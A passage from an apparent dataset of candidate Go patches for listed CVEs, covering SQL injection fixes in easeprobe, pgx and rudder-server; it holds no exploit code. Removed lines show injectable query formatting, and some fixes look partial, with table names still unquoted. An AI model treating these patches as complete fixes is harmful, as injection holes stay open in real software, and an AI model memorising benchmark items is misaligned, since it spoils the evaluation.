err\n-\t\t}\n-\t\tbuff.WriteRune('\\n')\n-\t\tbuff.Write(bin)\n-\t}\n-\n-\treturn t.verify(buff.Bytes(), digest)\n+        digestData := ReDigest.Find(data)\n+        if len(digestData) == 0 {\n+                return false, errors.New(\"digest not found\")\n+        }\n+\n+        digestData = bytes.TrimSpace(bytes.TrimPrefix(digestData, []byte(SignaturePattern)))\n+        // remove fragment from digest as it is used for re-signing purposes only\n+        digestString := strings.TrimSuffix(string(digestData), \":\"+t.GetUserFragment())\n+        digest, err := hex.DecodeString(digestString)\n+        if err != nil {\n+                return false, err\n+        }\n+\n+        buff := bytes.NewBuffer(RemoveSignatureFromData(data))\n+        // if file has any imports process them\n+        for _, file := range tmpl.GetFileImports() {\n+                bin, err := os.ReadFile(file)\n+                if err != nil {\n+                        return false, err\n+                }\n+                buff.WriteRune('\\n')\n+                buff.Write(bin)\n+        }\n+\n+        return t.verify(buff.Bytes(), digest)\n }\n \n // Verify verifies the given data with the template signer\n // Note: this should not be used for verifying templates as file references\n // in templates are not processed\n func (t *TemplateSigner) verify(data, signatureData []byte) (bool, error) {\n-\tdataHash := sha256.Sum256(data)\n+        dataHash := sha256.Sum256(data)\n \n-\tvar signature []byte\n-\tif err := gob.NewDecoder(bytes.NewReader(signatureData)).Decode(&signature); err != nil {\n-\t\treturn false, err\n-\t}\n-\treturn ecdsa.VerifyASN1(t.handler.ecdsaPubKey, dataHash[:], signature), nil\n+        var signature []byte\n+        if err := gob.NewDecoder(bytes.NewReader(signatureData)).Decode(&signature); err != nil {\n+                return false, err\n+        }\n+        return ecdsa.VerifyASN1(t.handler.ecdsaPubKey, dataHash[:], signature), nil\n }\n \n // NewTemplateSigner creates a new signer for signing templates\n func NewTemplateSigner(cert, privateKey []byte) (*TemplateSigner, error) {\n-\thandler := &KeyHandler{}\n-\tvar err error\n-\tif cert != nil || privateKey != nil {\n-\t\thandler.UserCert = cert\n-\t\thandler.PrivateKey = privateKey\n-\t} else {\n-\t\terr = handler.ReadCert(CertEnvVarName, config.DefaultConfig.GetKeysDir())\n-\t\tif err == nil {\n-\t\t\terr = handler.ReadPrivateKey(PrivateKeyEnvName, config.DefaultConfig.GetKeysDir())\n-\t\t}\n-\t}\n-\tif err != nil && !SkipGeneratingKeys {\n-\t\tif err != ErrNoCertificate && err != ErrNoPrivateKey {\n-\t\t\tgologger.Info().Msgf(\"Invalid user cert found : %s\\n\", err)\n-\t\t}\n-\t\t// generating new keys\n-\t\thandler.GenerateKeyPair()\n-\t\tif err := handler.SaveToDisk(config.DefaultConfig.GetKeysDir()); err != nil {\n-\t\t\tgologger.Fatal().Msgf(\"could not save generated keys to disk: %s\\n\", err)\n-\t\t}\n-\t\t// do not continue further let user re-run the command\n-\t\tos.Exit(0)\n-\t} else if err != nil && SkipGeneratingKeys {\n-\t\treturn nil, err\n-\t}\n-\n-\tif err := handler.ParseUserCert(); err != nil {\n-\t\treturn nil, err\n-\t}\n-\tif err := handler.ParsePrivateKey(); err != nil {\n-\t\treturn nil, err\n-\t}\n-\treturn &TemplateSigner{\n-\t\thandler: handler,\n-\t}, nil\n+        handler := &KeyHandler{}\n+        var err error\n+        if cert != nil || privateKey != nil {\n+                handler.UserCert = cert\n+                handler.PrivateKey = privateKey\n+        } else {\n+                err = handler.ReadCert(CertEnvVarName, config.DefaultConfig.GetKeysDir())\n+                if err == nil {\n+                        err = handler.ReadPrivateKey(PrivateKeyEnvName, config.DefaultConfig.GetKeysDir())\n+                }\n+        }\n+        if err != nil && !SkipGeneratingKeys {\n+                if err != ErrNoCertificate && err != ErrNoPrivateKey {\n+                        gologger.Info().Msgf(\"Invalid user cert found : %s\\n\", err)\n+                }\n+                // generating new keys\n+                handler.GenerateKeyPair()\n+                if err := handler.SaveToDisk(config.DefaultConfig.GetKeysDir()); err != nil {\n+                        gologger.Fatal().Msgf(\"could not save generated keys to disk: %s\\n\", err)\n+                }\n+                // do not continue further let user re-run the command\n+                os.Exit(0)\n+        } else if err != nil && SkipGeneratingKeys {\n+                return nil, err\n+        }\n+\n+        if err := handler.ParseUserCert(); err != nil {\n+                return nil, err\n+        }\n+        if err := handler.ParsePrivateKey(); err != nil {\n+                return nil, err\n+        }\n+        return &TemplateSigner{\n+                handler: handler,\n+        }, nil\n }\n \n // NewTemplateSignerFromFiles creates a new signer for signing templates\n func NewTemplateSignerFromFiles(cert, privKey string) (*TemplateSigner, error) {\n-\tcertData, err := os.ReadFile(cert)\n-\tif err != nil {\n-\t\treturn nil, err\n-\t}\n-\tprivKeyData, err := os.ReadFile(privKey)\n-\tif err != nil {\n-\t\treturn nil, err\n-\t}\n-\treturn NewTemplateSigner(certData, privKeyData)\n+        certData, err := os.ReadFile(cert)\n+        if err != nil {\n+                return nil, err\n+        }\n+        privKeyData, err := os.ReadFile(privKey)\n+        if err != nil {\n+                return nil, err\n+        }\n+        return NewTemplateSigner(certData, privKeyData)\n }\n \n // NewTemplateSigVerifier creates a new signer for verifying templates\n func NewTemplateSigVerifier(cert []byte) (*TemplateSigner, error) {\n-\thandler := &KeyHandler{}\n-\tif cert != nil {\n-\t\thandler.UserCert = cert\n-\t} else {\n-\t\tif err := handler.ReadCert(CertEnvVarName, config.DefaultConfig.GetKeysDir()); err != nil {\n-\t\t\treturn nil, err\n-\t\t}\n-\t}\n-\tif err := handler.ParseUserCert(); err != nil {\n-\t\treturn nil, err\n-\t}\n-\treturn &TemplateSigner{\n-\t\thandler: handler,\n-\t}, nil\n+        handler := &KeyHandler{}\n+        if cert != nil {\n+                handler.UserCert = cert\n+        } else {\n+                if err := handler.ReadCert(CertEnvVarName, config.DefaultConfig.GetKeysDir()); err != nil {\n+                        return nil, err\n+                }\n+        }\n+        if err := handler.ParseUserCert(); err != nil {\n+                return nil, err\n+        }\n+        return &TemplateSigner{\n+                handler: handler,\n+        }, nil\n }\n"}
{"cve":"CVE-2023-33967:0708", "fix_patch": "diff --git a/probe/client/mysql/mysql.go b/probe/client/mysql/mysql.go\nindex 572a330..05d7b24 100644\n--- a/probe/client/mysql/mysql.go\n+++ b/probe/client/mysql/mysql.go\n@@ -19,17 +19,17 @@\n package mysql\n \n import (\n-\t\"crypto/tls\"\n-\t\"database/sql\"\n-\t\"fmt\"\n-\t\"strconv\"\n-\t\"strings\"\n-\t\"time\"\n-\n-\t\"github.com/go-sql-driver/mysql\"\n-\t\"github.com/megaease/easeprobe/global\"\n-\t\"github.com/megaease/easeprobe/probe/client/conf\"\n-\tlog \"github.com/sirupsen/logrus\"\n+        \"crypto/tls\"\n+        \"database/sql\"\n+        \"fmt\"\n+        \"strconv\"\n+        \"strings\"\n+        \"time\"\n+\n+        \"github.com/go-sql-driver/mysql\"\n+        \"github.com/megaease/easeprobe/global\"\n+        \"github.com/megaease/easeprobe/probe/client/conf\"\n+        log \"github.com/sirupsen/logrus\"\n )\n \n // Kind is the type of driver\n@@ -37,140 +37,141 @@ const Kind string = \"MySQL\"\n \n // MySQL is the MySQL client\n type MySQL struct {\n-\tconf.Options `yaml:\",inline\"`\n-\ttls          *tls.Config `yaml:\"-\" json:\"-\"`\n-\tConnStr      string      `yaml:\"conn_str,omitempty\" json:\"conn_str,omitempty\"`\n+        conf.Options `yaml:\",inline\"`\n+        tls          *tls.Config `yaml:\"-\" json:\"-\"`\n+        ConnStr      string      `yaml:\"conn_str,omitempty\" json:\"conn_str,omitempty\"`\n }\n \n // New create a Mysql client\n func New(opt conf.Options) (*MySQL, error) {\n \n-\tvar conn string\n-\tif len(opt.Password) > 0 {\n-\t\tconn = fmt.Sprintf(\"%s:%s@tcp(%s)/?timeout=%s\",\n-\t\t\topt.Username, opt.Password, opt.Host, opt.Timeout().Round(time.Second))\n-\t} else {\n-\t\tconn = fmt.Sprintf(\"%s@tcp(%s)/?timeout=%s\",\n-\t\t\topt.Username, opt.Host, opt.Timeout().Round(time.Second))\n-\t}\n-\n-\ttls, err := opt.TLS.Config()\n-\tif err != nil {\n-\t\tlog.Errorf(\"[%s / %s / %s] - TLS Config Error - %v\", opt.ProbeKind, opt.ProbeName, opt.ProbeTag, err)\n-\t\treturn nil, fmt.Errorf(\"TLS Config Error - %v\", err)\n-\t} else if tls != nil {\n-\t\tconn += \"&tls=\" + global.DefaultProg\n-\t}\n-\n-\tm := &MySQL{\n-\t\tOptions: opt,\n-\t\ttls:     tls,\n-\t\tConnStr: conn,\n-\t}\n-\n-\tif err := m.checkData(); err != nil {\n-\t\treturn nil, err\n-\t}\n-\treturn m, nil\n+        var conn string\n+        if len(opt.Password) > 0 {\n+                conn = fmt.Sprintf(\"%s:%s@tcp(%s)/?timeout=%s\",\n+                        opt.Username, opt.Password, opt.Host, opt.Timeout().Round(time.Second))\n+        } else {\n+                conn = fmt.Sprintf(\"%s@tcp(%s)/?timeout=%s\",\n+                        opt.Username, opt.Host, opt.Timeout().Round(time.Second))\n+        }\n+\n+        tls, err := opt.TLS.Config()\n+        if err != nil {\n+                log.Errorf(\"[%s / %s / %s] - TLS Config Error - %v\", opt.ProbeKind, opt.ProbeName, opt.ProbeTag, err)\n+                return nil, fmt.Errorf(\"TLS Config Error - %v\", err)\n+        } else if tls != nil {\n+                conn += \"&tls=\" + global.DefaultProg\n+        }\n+\n+        m := &MySQL{\n+                Options: opt,\n+                tls:     tls,\n+                ConnStr: conn,\n+        }\n+\n+        if err := m.checkData(); err != nil {\n+                return nil, err\n+        }\n+        return m, nil\n }\n \n // Kind return the name of client\n func (r *MySQL) Kind() string {\n-\treturn Kind\n+        return Kind\n }\n \n // checkData do the data checking\n func (r *MySQL) checkData() error {\n \n-\tfor k := range r.Data {\n-\t\tif _, err := r.getSQL(k); err != nil {\n-\t\t\treturn err\n-\t\t}\n-\t}\n+        for k := range r.Data {\n+if _, _, err := r.getSQL(k); err != nil {\n+return err\n+}\n+}\n \n-\treturn nil\n+        return nil\n }\n \n // Probe do the health check\n func (r *MySQL) Probe() (bool, string) {\n \n-\tif r.tls != nil {\n-\t\tmysql.RegisterTLSConfig(global.DefaultProg, r.tls)\n-\t}\n-\n-\tdb, err := sql.Open(\"mysql\", r.ConnStr)\n-\tif err != nil {\n-\t\treturn false, err.Error()\n-\t}\n-\tdefer db.Close()\n-\n-\t// Check if we need to query specific data\n-\tif len(r.Data) > 0 {\n-\t\tfor k, v := range r.Data {\n-\t\t\tlog.Debugf(\"[%s / %s / %s] - Verifying Data - [%s] : [%s]\", r.ProbeKind, r.ProbeName, r.ProbeTag, k, v)\n-\t\t\tsql, err := r.getSQL(k)\n-\t\t\tif err != nil {\n-\t\t\t\treturn false, err.Error()\n-\t\t\t}\n-\t\t\tlog.Debugf(\"[%s / %s / %s] - SQL - [%s]\", r.ProbeKind, r.ProbeName, r.ProbeTag, sql)\n-\t\t\trows, err := db.Query(sql)\n-\t\t\tif err != nil {\n-\t\t\t\treturn false, err.Error()\n-\t\t\t}\n-\t\t\tif !rows.Next() {\n-\t\t\t\trows.Close()\n-\t\t\t\treturn false, fmt.Sprintf(\"No data found for [%s]\", k)\n-\t\t\t}\n-\t\t\t//check the value is equal to the value in data\n-\t\t\tvar value string\n-\t\t\tif err := rows.Scan(&value); err != nil {\n-\t\t\t\trows.Close()\n-\t\t\t\treturn false, err.Error()\n-\t\t\t}\n-\t\t\tif value != v {\n-\t\t\t\trows.Close()\n-\t\t\t\treturn false, fmt.Sprintf(\"Value not match for [%s] expected [%s] got [%s] \", k, v, value)\n-\t\t\t}\n-\t\t\trows.Close()\n-\t\t\tlog.Debugf(\"[%s / %s / %s] - Data Verified Successfully! - [%s] : [%s]\", r.ProbeKind, r.ProbeName, r.ProbeTag, k, v)\n-\t\t}\n-\t} else {\n-\t\terr = db.Ping()\n-\t\tif err != nil {\n-\t\t\treturn false, err.Error()\n-\t\t}\n-\t\trow, err := db.Query(\"show status like \\\"uptime\\\"\") // run a SQL to test\n-\t\tif err != nil {\n-\t\t\treturn false, err.Error()\n-\t\t}\n-\t\tdefer row.Close()\n-\t}\n-\n-\treturn true, \"Check MySQL Server Successfully!\"\n+        if r.tls != nil {\n+                mysql.RegisterTLSConfig(global.DefaultProg, r.tls)\n+        }\n+\n+        db, err := sql.Open(\"mysql\", r.ConnStr)\n+        if err != nil {\n+                return false, err.Error()\n+        }\n+        defer db.Close()\n+\n+        // Check if we need to query specific data\n+        if len(r.Data) > 0 {\n+                for k, v := range r.Data {\n+log.Debugf(\"[%s / %s / %s] - Verifying Data - [%s] : [%s]\", r.ProbeKind, r.ProbeName, r.ProbeTag, k, v)\n+sql, args, err := r.getSQL(k)\n+if err != nil {\n+return false, err.Error()\n+}\n+log.Debugf(\"[%s / %s / %s] - SQL - [%s]\", r.ProbeKind, r.ProbeName, r.ProbeTag, sql)\n+rows, err := db.Query(sql, args...)\n+if err != nil {\n+return false, err.Error()\n+}\n+if !rows.Next() {\n+rows.Close()\n+return false, fmt.Sprintf(\"No data found for [%s]\", k)\n+}\n+//check the value is equal to the value in data\n+var value string\n+if err := rows.Scan(&value); err != nil {\n+rows.Close()\n+return false, err.Error()\n+}\n+if value != v {\n+rows.Close()\n+return false, fmt.Sprintf(\"Value not match for [%s] expected [%s] got [%s] \", k, v, value)\n+}\n+rows.Close()\n+log.Debugf(\"[%s / %s / %s] - Data Verified Successfully! - [%s] : [%s]\", r.ProbeKind, r.ProbeName, r.ProbeTag, k, v)\n+}\n+        } else {\n+                err = db.Ping()\n+                if err != nil {\n+                        return false, err.Error()\n+                }\n+                row, err := db.Query(\"show status like \\\"uptime\\\"\") // run a SQL to test\n+                if err != nil {\n+                        return false, err.Error()\n+                }\n+                defer row.Close()\n+        }\n+\n+        return true, \"Check MySQL Server Successfully!\"\n \n }\n \n // getSQL get the SQL statement\n // input: database:table:column:key:value\n // output: SELECT column FROM database.table WHERE key = value\n-func (r *MySQL) getSQL(str string) (string, error) {\n-\tif len(strings.TrimSpace(str)) == 0 {\n-\t\treturn \"\", fmt.Errorf(\"Empty SQL data\")\n-\t}\n-\tfields := strings.Split(str, \":\")\n-\tif len(fields) != 5 {\n-\t\treturn \"\", fmt.Errorf(\"Invalid SQL data - [%s]. (syntax: database:table:field:key:value)\", str)\n-\t}\n-\tdb := fields[0]\n-\ttable := fields[1]\n-\tfield := fields[2]\n-\tkey := fields[3]\n-\tvalue := fields[4]\n-\t//check value is int or not\n-\tif _, err := strconv.Atoi(value); err != nil {\n-\t\treturn \"\", fmt.Errorf(\"Invalid SQL data - [%s], the value must be int\", str)\n-\t}\n-\n-\tsql := fmt.Sprintf(\"SELECT %s FROM %s.%s WHERE %s = %s\", field, db, table, key, value)\n-\treturn sql, nil\n+func (r *MySQL) getSQL(str string) (string, []interface{}, error) {\n+if len(strings.TrimSpace(str)) == 0 {\n+return \"\", nil, fmt.Errorf(\"Empty SQL data\")\n+}\n+fields := strings.Split(str, \":\")\n+if len(fields) != 5 {\n+return \"\", nil, fmt.Errorf(\"Invalid SQL data - [%s]. (syntax: database:table:field:key:value)\", str)\n+}\n+db := fields[0]\n+table := fields[1]\n+field := fields[2]\n+key := fields[3]\n+value := fields[4]\n+//check value is int or not\n+if _, err := strconv.Atoi(value); err != nil {\n+return \"\", nil, fmt.Errorf(\"Invalid SQL data - [%s], the value must be int\", str)\n+}\n+\n+// To avoid SQL injection, we use placeholders\n+sql := fmt.Sprintf(\"SELECT %s FROM %s.%s WHERE %s = ?\", field, db, table, key)\n+return sql, []interface{}{value}, nil\n }\n"}
{"cve":"CVE-2024-27289:0708", "fix_patch": "diff --git a/internal/sanitize/sanitize.go b/internal/sanitize/sanitize.go\nindex e0c9427c..386bf4ac 100644\n--- a/internal/sanitize/sanitize.go\n+++ b/internal/sanitize/sanitize.go\n@@ -47,14 +47,14 @@ func (q *Query) Sanitize(args ...interface{}) (string, error) {\n \t\t\t\t// Prevent SQL injection via Line Comment Creation\n \t\t\t\t// https://github.com/jackc/pgx/security/advisories/GHSA-m7wr-2xf7-cm9p\n \t\t\t\tif arg < 0 {\n-\t\t\t\t\tstr = \"(\" + str + \")\"\n+\t\t\t\t\tstr = \" (\" + str + \")\"\n \t\t\t\t}\n \t\t\tcase float64:\n \t\t\t\t// Prevent SQL injection via Line Comment Creation\n \t\t\t\t// https://github.com/jackc/pgx/security/advisories/GHSA-m7wr-2xf7-cm9p\n \t\t\t\tstr = strconv.FormatFloat(arg, 'f', -1, 64)\n \t\t\t\tif arg < 0 {\n-\t\t\t\t\tstr = \"(\" + str + \")\"\n+\t\t\t\t\tstr = \" (\" + str + \")\"\n \t\t\t\t}\n \t\t\tcase bool:\n \t\t\t\tstr = strconv.FormatBool(arg)\n"}
{"cve":"CVE-2023-30625:0708", "fix_patch": "diff --git a/router/failed-events-manager.go b/router/failed-events-manager.go\nindex b76908fb..5247f570 100644\n--- a/router/failed-events-manager.go\n+++ b/router/failed-events-manager.go\n@@ -1,190 +1,190 @@\n package router\n \n import (\n-\t\"context\"\n-\t\"database/sql\"\n-\t\"encoding/json\"\n-\t\"fmt\"\n-\t\"strings\"\n-\t\"time\"\n-\n-\t\"github.com/rudderlabs/rudder-server/utils/misc\"\n+        \"context\"\n+        \"database/sql\"\n+        \"encoding/json\"\n+        \"fmt\"\n+        \"strings\"\n+        \"time\"\n+\n+        \"github.com/rudderlabs/rudder-server/utils/misc\"\n )\n \n var failedEventsManager FailedEventsManagerI\n \n type FailedEventRowT struct {\n-\tDestinationID string          `json:\"destination_id\"`\n-\tRecordID      json.RawMessage `json:\"record_id\"`\n+        DestinationID string          `json:\"destination_id\"`\n+        RecordID      json.RawMessage `json:\"record_id\"`\n }\n \n var (\n-\tfailedKeysTablePrefix  = \"failed_keys\"\n-\tfailedKeysExpire       time.Duration\n-\tfailedKeysCleanUpSleep time.Duration\n-\tfailedKeysEnabled      bool\n+        failedKeysTablePrefix  = \"failed_keys\"\n+        failedKeysExpire       time.Duration\n+        failedKeysCleanUpSleep time.Duration\n+        failedKeysEnabled      bool\n )\n \n type FailedEventsManagerI interface {\n-\tSaveFailedRecordIDs(map[string][]*FailedEventRowT, *sql.Tx)\n-\tDropFailedRecordIDs(jobRunID string)\n-\tFetchFailedRecordIDs(jobRunID string) []*FailedEventRowT\n-\tGetDBHandle() *sql.DB\n+        SaveFailedRecordIDs(map[string][]*FailedEventRowT, *sql.Tx)\n+        DropFailedRecordIDs(jobRunID string)\n+        FetchFailedRecordIDs(jobRunID string) []*FailedEventRowT\n+        GetDBHandle() *sql.DB\n }\n \n type FailedEventsManagerT struct {\n-\tdbHandle *sql.DB\n+        dbHandle *sql.DB\n }\n \n func GetFailedEventsManager() FailedEventsManagerI {\n-\tif failedEventsManager == nil {\n-\t\tfem := new(FailedEventsManagerT)\n-\t\tdbHandle, err := sql.Open(\"postgres\", misc.GetConnectionString())\n-\t\tif err != nil {\n-\t\t\tpanic(err)\n-\t\t}\n-\t\tfem.dbHandle = dbHandle\n-\t\tfailedEventsManager = fem\n-\t}\n-\n-\treturn failedEventsManager\n+        if failedEventsManager == nil {\n+                fem := new(FailedEventsManagerT)\n+                dbHandle, err := sql.Open(\"postgres\", misc.GetConnectionString())\n+                if err != nil {\n+                        panic(err)\n+                }\n+                fem.dbHandle = dbHandle\n+                failedEventsManager = fem\n+        }\n+\n+        return failedEventsManager\n }\n \n func (*FailedEventsManagerT) SaveFailedRecordIDs(taskRunIDFailedEventsMap map[string][]*FailedEventRowT, txn *sql.Tx) {\n-\tif !failedKeysEnabled {\n-\t\treturn\n-\t}\n-\n-\tfor taskRunID, failedEvents := range taskRunIDFailedEventsMap {\n-\t\ttable := `\"` + strings.ReplaceAll(fmt.Sprintf(`%s_%s`, failedKeysTablePrefix, taskRunID), `\"`, `\"\"`) + `\"`\n-\t\tsqlStatement := fmt.Sprintf(`CREATE TABLE IF NOT EXISTS %s (\n-\t\tdestination_id TEXT NOT NULL,\n-\t\trecord_id JSONB NOT NULL,\n-\t\tcreated_at TIMESTAMP NOT NULL);`, table)\n-\t\t_, err := txn.Exec(sqlStatement)\n-\t\tif err != nil {\n-\t\t\t_ = txn.Rollback()\n-\t\t\tpanic(err)\n-\t\t}\n-\t\tinsertQuery := fmt.Sprintf(`INSERT INTO %s VALUES($1, $2, $3);`, table)\n-\t\tstmt, err := txn.Prepare(insertQuery)\n-\t\tif err != nil {\n-\t\t\t_ = txn.Rollback()\n-\t\t\tpanic(err)\n-\t\t}\n-\t\tcreatedAt := time.Now()\n-\t\tfor _, failedEvent := range failedEvents {\n-\t\t\tif len(failedEvent.RecordID) == 0 || !json.Valid(failedEvent.RecordID) {\n-\t\t\t\tpkgLogger.Infof(\"skipped adding invalid recordId: %s, to failed keys table: %s\", failedEvent.RecordID, table)\n-\t\t\t\tcontinue\n-\t\t\t}\n-\t\t\t_, err = stmt.Exec(failedEvent.DestinationID, failedEvent.RecordID, createdAt)\n-\t\t\tif err != nil {\n-\t\t\t\tpanic(err)\n-\t\t\t}\n-\t\t}\n-\n-\t\tstmt.Close()\n-\t}\n+        if !failedKeysEnabled {\n+                return\n+        }\n+\n+        for taskRunID, failedEvents := range taskRunIDFailedEventsMap {\n+                table := `\"` + strings.ReplaceAll(fmt.Sprintf(`%s_%s`, failedKeysTablePrefix, taskRunID), `\"`, `\"\"`) + `\"`\n+                sqlStatement := fmt.Sprintf(`CREATE TABLE IF NOT EXISTS %s (\n+                destination_id TEXT NOT NULL,\n+                record_id JSONB NOT NULL,\n+                created_at TIMESTAMP NOT NULL);`, table)\n+                _, err := txn.Exec(sqlStatement)\n+                if err != nil {\n+                        _ = txn.Rollback()\n+                        panic(err)\n+                }\n+                insertQuery := fmt.Sprintf(`INSERT INTO %s VALUES($1, $2, $3);`, table)\n+                stmt, err := txn.Prepare(insertQuery)\n+                if err != nil {\n+                        _ = txn.Rollback()\n+                        panic(err)\n+                }\n+                createdAt := time.Now()\n+                for _, failedEvent := range failedEvents {\n+                        if len(failedEvent.RecordID) == 0 || !json.Valid(failedEvent.RecordID) {\n+                                pkgLogger.Infof(\"skipped adding invalid recordId: %s, to failed keys table: %s\", failedEvent.RecordID, table)\n+                                continue\n+                        }\n+                        _, err = stmt.Exec(failedEvent.DestinationID, failedEvent.RecordID, createdAt)\n+                        if err != nil {\n+                                panic(err)\n+                        }\n+                }\n+\n+                stmt.Close()\n+        }\n }\n \n func (fem *FailedEventsManagerT) DropFailedRecordIDs(taskRunID string) {\n-\tif !failedKeysEnabled {\n-\t\treturn\n-\t}\n-\n-\t// Drop table\n-\ttable := fmt.Sprintf(`%s_%s`, failedKeysTablePrefix, taskRunID)\n-\tsqlStatement := fmt.Sprintf(`DROP TABLE IF EXISTS %s`, table)\n-\t_, err := fem.dbHandle.Exec(sqlStatement)\n-\tif err != nil {\n-\t\tpkgLogger.Errorf(\"Failed to drop table %s with error: %v\", taskRunID, err)\n-\t}\n+        if !failedKeysEnabled {\n+                return\n+        }\n+\n+        // Drop table\n+        table := fmt.Sprintf(`%s_%s`, failedKeysTablePrefix, taskRunID)\n+        sqlStatement := fmt.Sprintf(`DROP TABLE IF EXISTS %s`, misc.QuoteIdentifier(table))\n+        _, err := fem.dbHandle.Exec(sqlStatement)\n+        if err != nil {\n+                pkgLogger.Errorf(\"Failed to drop table %s with error: %v\", taskRunID, err)\n+        }\n }\n \n func (fem *FailedEventsManagerT) FetchFailedRecordIDs(taskRunID string) []*FailedEventRowT {\n-\tif !failedKeysEnabled {\n-\t\treturn []*FailedEventRowT{}\n-\t}\n+        if !failedKeysEnabled {\n+                return []*FailedEventRowT{}\n+        }\n \n-\tfailedEvents := make([]*FailedEventRowT, 0)\n+        failedEvents := make([]*FailedEventRowT, 0)\n \n-\tvar rows *sql.Rows\n-\tvar err error\n-\ttable := `\"` + strings.ReplaceAll(fmt.Sprintf(`%s_%s`, failedKeysTablePrefix, taskRunID), `\"`, `\"\"`) + `\"`\n-\tsqlStatement := fmt.Sprintf(`SELECT %[1]s.destination_id, %[1]s.record_id\n+        var rows *sql.Rows\n+        var err error\n+        table := `\"` + strings.ReplaceAll(fmt.Sprintf(`%s_%s`, failedKeysTablePrefix, taskRunID), `\"`, `\"\"`) + `\"`\n+        sqlStatement := fmt.Sprintf(`SELECT %[1]s.destination_id, %[1]s.record_id\n                                              FROM %[1]s `, table)\n-\trows, err = fem.dbHandle.Query(sqlStatement)\n-\tif err != nil {\n-\t\tpkgLogger.Errorf(\"Failed to fetch from table %s with error: %v\", taskRunID, err)\n-\t\treturn failedEvents\n-\t}\n-\tdefer rows.Close()\n-\n-\tfor rows.Next() {\n-\t\tvar failedEvent FailedEventRowT\n-\t\terr := rows.Scan(&failedEvent.DestinationID, &failedEvent.RecordID)\n-\t\tif err != nil {\n-\t\t\tpanic(err)\n-\t\t}\n-\t\tfailedEvents = append(failedEvents, &failedEvent)\n-\t}\n-\n-\treturn failedEvents\n+        rows, err = fem.dbHandle.Query(sqlStatement)\n+        if err != nil {\n+                pkgLogger.Errorf(\"Failed to fetch from table %s with error: %v\", taskRunID, err)\n+                return failedEvents\n+        }\n+        defer rows.Close()\n+\n+        for rows.Next() {\n+                var failedEvent FailedEventRowT\n+                err := rows.Scan(&failedEvent.DestinationID, &failedEvent.RecordID)\n+                if err != nil {\n+                        panic(err)\n+                }\n+                failedEvents = append(failedEvents, &failedEvent)\n+        }\n+\n+        return failedEvents\n }\n \n func CleanFailedRecordsTableProcess(ctx context.Context) {\n-\tif !failedKeysEnabled {\n-\t\treturn\n-\t}\n-\n-\tfor {\n-\t\tselect {\n-\t\tcase <-ctx.Done():\n-\t\t\treturn\n-\t\tcase <-time.After(failedKeysCleanUpSleep):\n-\t\t\tdbHandle, err := sql.Open(\"postgres\", misc.GetConnectionString())\n-\t\t\tif err != nil {\n-\t\t\t\tpanic(err)\n-\t\t\t}\n-\t\t\tfailedKeysLike := failedKeysTablePrefix + \"%\"\n-\t\t\tfailedKeysTableQuery := fmt.Sprintf(`SELECT table_name\n-\t\t\t\t\t\t\t\t\t\t\t\t\tFROM information_schema.tables\n-\t\t\t\t\t\t\t\t\t\t\t\t\tWHERE table_schema='public' AND table_type='BASE TABLE' AND table_name ilike '%s'`, failedKeysLike)\n-\t\t\trows, err := dbHandle.Query(failedKeysTableQuery)\n-\t\t\tif err != nil {\n-\t\t\t\tpanic(err)\n-\t\t\t}\n-\t\t\tfor rows.Next() {\n-\t\t\t\tvar table string\n-\t\t\t\terr = rows.Scan(&table)\n-\t\t\t\tif err != nil {\n-\t\t\t\t\tpkgLogger.Errorf(\"Failed to scan failed keys table %s with error: %v\", table, err)\n-\t\t\t\t\treturn\n-\t\t\t\t}\n-\t\t\t\tlatestCreatedAtQuery := fmt.Sprintf(`SELECT created_at from %s order by created_at desc limit 1`, table)\n-\t\t\t\trow := dbHandle.QueryRow(latestCreatedAtQuery)\n-\t\t\t\tvar latestCreatedAt time.Time\n-\t\t\t\terr = row.Scan(&latestCreatedAt)\n-\t\t\t\tif err != nil && err != sql.ErrNoRows {\n-\t\t\t\t\tpkgLogger.Errorf(\"Failed to fetch records from failed keys table %s with error: %v\", table, err)\n-\t\t\t\t\tcontinue\n-\t\t\t\t}\n-\t\t\t\tcurrentTime := time.Now()\n-\t\t\t\tdiff := currentTime.Sub(latestCreatedAt)\n-\t\t\t\tif diff > failedKeysExpire {\n-\t\t\t\t\tdropQuery := fmt.Sprintf(`DROP TABLE IF EXISTS %s`, table)\n-\t\t\t\t\trows, err = dbHandle.Query(dropQuery)\n-\t\t\t\t\tif err != nil {\n-\t\t\t\t\t\tpkgLogger.Errorf(\"Failed to drop table %s with error: %v\", table, err)\n-\t\t\t\t\t}\n-\t\t\t\t}\n-\t\t\t}\n-\t\t\tdbHandle.Close()\n-\t\t}\n-\t}\n+        if !failedKeysEnabled {\n+                return\n+        }\n+\n+        for {\n+                select {\n+                case <-ctx.Done():\n+                        return\n+                case <-time.After(failedKeysCleanUpSleep):\n+                        dbHandle, err := sql.Open(\"postgres\", misc.GetConnectionString())\n+                        if err != nil {\n+                                panic(err)\n+                        }\n+                        failedKeysLike := failedKeysTablePrefix + \"%\"\n+                        failedKeysTableQuery := fmt.Sprintf(`SELECT table_name\n+                                                                                                        FROM information_schema.tables\n+                                                                                                        WHERE table_schema='public' AND table_type='BASE TABLE' AND table_name ilike '%s'`, failedKeysLike)\n+                        rows, err := dbHandle.Query(failedKeysTableQuery)\n+                        if err != nil {\n+                                panic(err)\n+                        }\n+                        for rows.Next() {\n+                                var table string\n+                                err = rows.Scan(&table)\n+                                if err != nil {\n+                                        pkgLogger.Errorf(\"Failed to scan failed keys table %s with error: %v\", table, err)\n+                                        return\n+                                }\n+                                latestCreatedAtQuery := fmt.Sprintf(`SELECT created_at from %s order by created_at desc limit 1`, table)\n+                                row := dbHandle.QueryRow(latestCreatedAtQuery)\n+                                var latestCreatedAt time.Time\n+                                err = row.Scan(&latestCreatedAt)\n+                                if err != nil && err != sql.ErrNoRows {\n+                                        pkgLogger.Errorf(\"Failed to fetch records from failed keys table %s with error: %v\", table, err)\n+                                        continue\n+                                }\n+                                currentTime := time.Now()\n+                                diff := currentTime.Sub(latestCreatedAt)\n+                                if diff > failedKeysExpire {\n+                                        dropQuery := fmt.Sprintf(`DROP TABLE IF EXISTS %s`, table)\n+                                        rows, err = dbHandle.Query(dropQuery)\n+                                        if err != nil {\n+                                                pkgLogger.Errorf(\"Failed to drop table %s with error: %v\", table, err)\n+                                        }\n+                                }\n+                        }\n+                        dbHandle.Close()\n+                }\n+        }\n }\n \n func (fem *FailedEventsManagerT) GetDBHandle() *sql.DB {\n-\treturn fem.dbHandle\n+        return fem.dbHandle\n }\ndiff --git a/temp_dbutils.go b/temp_dbutils.go\nnew file mode 100644\nindex 00000000..6a93f61e\n--- /dev/null\n+++ b/temp_dbutils.go\n@@ -0,0 +1,77 @@\n+package 